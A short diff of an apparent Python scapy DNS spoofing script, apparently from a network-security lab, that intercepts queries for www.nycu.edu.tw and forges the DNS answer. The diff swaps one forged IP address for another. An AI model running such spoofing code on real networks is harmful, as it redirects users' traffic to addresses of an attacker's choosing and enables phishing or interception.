@@ -14,8 +14,7 @@ def process_packet(packet):
         qname = scapy_packet[DNSQR].qname
         if "www.nycu.edu.tw" in qname.decode():
             print("[+] Spoofing target")
-            # answer = DNSRR(rrname=qname, rdata="140.113.207.237")
-            answer = DNSRR(rrname=qname, rdata="66.254.114.41")
+            answer = DNSRR(rrname=qname, rdata="140.113.207.237")
             scapy_packet[DNS].an = answer
             scapy_packet[DNS].ancount = 1
 
